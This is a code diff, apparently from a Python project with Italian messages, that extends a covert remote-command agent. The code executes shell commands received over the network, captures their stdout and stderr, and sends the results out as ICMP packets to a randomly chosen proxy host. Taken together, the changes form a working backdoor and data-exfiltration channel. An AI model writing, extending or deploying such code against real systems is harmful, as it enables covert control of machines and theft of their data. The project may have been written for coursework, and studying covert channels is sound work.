@@ -8,6 +8,7 @@ import comunication_methods as com
 import re
 import random
 import sys
+import select
 
 sniffed_data=None    
 
@@ -63,6 +64,9 @@ def conn_from_proxy():
     print(f"I proxy utilzzabili sono: {len(proxy_ip)}\n\t{proxy_ip}") 
 
 #--Parte 1--#
+def choose_proxy():
+    return random.choice(proxy_ip)
+
 def get_value_of_parser(args):
     print(args) 
     if not isinstance(args, argparse.Namespace) or args is None:
@@ -120,6 +124,56 @@ def part_1():
         print(f"An Exception has occured: {e}") 
         exit(1)
 
+def send_data_to_proxies(data_to_send:list=None,ip_dst=None):
+    if data_to_send==None:
+        raise ValueError("Dati incorretti")
+    if not isinstance(ip_dst,str) or re.match(com.ip_reg_pattern, ip_dst) is None:
+        raise ValueError("send_data_to_proxies: IP non valido ",ip_dst) 
+    print("I dati che verranno mandati a", ip_dst," sono: ",data_to_send) 
+    data_has_being_sent=False
+    sequenza=0
+    for data in data_to_send:
+        if isinstance(data,bytes):
+            data_has_being_sent=com.send_packet(data,ip_dst,icmp_seq=sequenza)
+        else:
+            data_has_being_sent=com.send_packet(data.encode(),ip_dst,icmp_seq=sequenza)
+        if not data_has_being_sent:
+            print("Il proxy ",ip_dst, " non ha ricevuto ",data)
+        #if data_has_being_sent:
+            #print(f"Dati mandati a {ip_dst}")
+        sequenza+=1
+
+def get_data_from_command(shell_process):
+    print(f"Did command failed? {shell_process.poll()}")
+    continue_read=shell_process.poll() is None
+    data=[]
+    while continue_read: 
+        reads = [shell_process.stdout.fileno(), shell_process.stderr.fileno()]
+        ret = select.select(reads, [], [])
+        for fd in ret[0]:
+            if fd == shell_process.stdout.fileno():
+                output_line = shell_process.stdout.readline()
+                if output_line:
+                    data.append(output_line)
+                    print("stdout:", output_line, end='')
+                if output_line.strip() == "__END__".strip():
+                    print(f"No more lines")
+                    continue_read=False
+                    break
+                if not output_line:
+                    print(f"EOF {output_line}") 
+                    continue_read=False
+                    break
+            if fd == shell_process.stderr.fileno():
+                error_line = shell_process.stderr.readline()
+                if error_line:
+                    data.append(error_line)
+                    print("stderr:", error_line, end='')
+        #if shell_process.poll() is not None:
+            #break 
+    print(f"Command finished with exit code {shell_process.poll()}")
+    return data
+
 def execute_command(command): 
     if isinstance(command, bytes):
         command=command.decode()
@@ -140,25 +194,13 @@ def execute_command(command):
         exit(1)
     print("Shell aperta con successo...")
     print(f"Esecuzione comando: {command}")
-    shell_process.stdin.write(f"{command.replace('\n','' '')}; echo __END__ \n")
-    shell_process.stdin.flush()
-    print(f"Did command failed? {shell_process.poll()}")
-    while True: 
-        if shell_process.poll() is not None: 
-            error_line=shell_process.stderr.readline()
-            print(f"Error: {error_line}") 
-        error_line=shell_process.stderr.readline()
-        output_line = shell_process.stdout.readline() 
-        if error_line: 
-            print(f"Error: {error_line}") 
-        print(f"Output: {output_line}", end='') 
-        if not output_line:
-            print(f"EOF {output_line}") 
-            break
-        if output_line.strip() == "__END__".strip():
-            print(f"No more lines")
-            break 
-    print(f"Command finished with exit code {shell_process.poll()}")
+    shell_process.stdin.write(f"{command.replace('\n','' '')}; echo {com.LAST_PACKET} \n")
+    shell_process.stdin.flush() 
+    try:
+        return get_data_from_command(shell_process)
+    except Exception as e:
+        print(f"get_data_from_command: {e}")
+    
     #shell_process.wait()  # Attende la chiusura del processo
     #shell_process.terminate()  # Termina il processo
 
@@ -195,13 +237,13 @@ def part_2():
     if com.timeout_timer.is_alive(): 
         com.timeout_timer.cancel() 
         try:
-            execute_command(command.decode())
+            data=execute_command(command.decode())
+            chosen_proxy=choose_proxy()
+            print("Ip host è ",proxy_ip)
+            print("Proxy scelto è ",chosen_proxy)
+            send_data_to_proxies(data,chosen_proxy)
         except Exception as e:
-            print(f"part_2: execute_command: {e}")
-        data="dati derivati dal comando".encode()
-        chosen_proxy=random.choice(proxy_ip)
-        if com.send_packet(data, chosen_proxy):
-            print(f"Dati mandati a {chosen_proxy}")
+            print(f"part_2: execute_command: {e}") 
     print(f"I proxy utilzzabili sono: {len(proxy_ip)}\n\t{proxy_ip}") 
 
 if __name__=="__main__":
